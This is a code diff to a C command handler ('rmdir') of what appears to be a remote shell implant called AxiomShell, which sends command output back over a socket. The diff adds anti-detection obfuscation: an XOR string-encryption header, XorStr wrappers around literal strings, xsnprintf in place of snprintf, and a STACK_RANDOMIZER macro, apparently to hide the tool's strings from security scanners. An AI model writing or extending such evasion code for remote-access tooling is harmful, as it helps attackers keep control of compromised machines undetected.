@@ -2,9 +2,11 @@
 #include <errno.h>
 #include <stdio.h>
 #include "AxiomShell.h"
+#include "autoxor.h"
 
 BOOL BUILTIN_rmdir(SOCKET sock, size_t argc, char **argv)
 {
+	STACK_RANDOMIZER;
 	BOOL res;
 	size_t i;
 	DWORD ftyp;
@@ -13,7 +15,7 @@ BOOL BUILTIN_rmdir(SOCKET sock, size_t argc, char **argv)
 	memset(err_buf, 0, sizeof(err_buf));
 	if (argc == 0)
 	{
-		JSON_send_packets(JsonCommandOutput, sock, (void *)"[!] Usage: rmdir [{PATH_1}, {PATH_2}, ...]\n");
+		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] Usage: rmdir [{PATH_1}, {PATH_2}, ...]\n"));
 		return (FALSE);
 	}
 
@@ -24,7 +26,7 @@ BOOL BUILTIN_rmdir(SOCKET sock, size_t argc, char **argv)
 		ftyp = GetFileAttributesA(argv[i]);
 		if (!(ftyp & FILE_ATTRIBUTE_DIRECTORY))
 		{
-			snprintf(err_buf, sizeof(err_buf), "[!] Can not delete %s: not a directory\n", argv[i]);
+			xsnprintf(err_buf, sizeof(err_buf), "[!] Can not delete %s: not a directory\n", argv[i]);
 			JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
 			i++;
 			continue;
@@ -36,19 +38,19 @@ BOOL BUILTIN_rmdir(SOCKET sock, size_t argc, char **argv)
 			switch (errno)
 			{
 				case ENOENT:
-					snprintf(err_buf, sizeof(err_buf), "[!] Error deleting directory %s: No such file or directory\n", argv[i]);
+					xsnprintf(err_buf, sizeof(err_buf), "[!] Error deleting directory %s: No such file or directory\n", argv[i]);
 					JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
 					break;
 				case EACCES:
-					snprintf(err_buf, sizeof(err_buf), "[!] Error deleting directory %s: Permission denied\n", argv[i]);
+					xsnprintf(err_buf, sizeof(err_buf), "[!] Error deleting directory %s: Permission denied\n", argv[i]);
 					JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
 					break;
 				case ENOTEMPTY:
-					snprintf(err_buf, sizeof(err_buf), "[!] Error deleting directory %s: Directory not empty or is the current working directory\n", argv[i]);
+					xsnprintf(err_buf, sizeof(err_buf), "[!] Error deleting directory %s: Directory not empty or is the current working directory\n", argv[i]);
 					JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
 					break;
 				default:
-					snprintf(err_buf, sizeof(err_buf), "[!] Error deleting directory %s: Unknown error (%d)\n", argv[i], errno);
+					xsnprintf(err_buf, sizeof(err_buf), "[!] Error deleting directory %s: Unknown error (%d)\n", argv[i], errno);
 					JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
 					break;
 			}
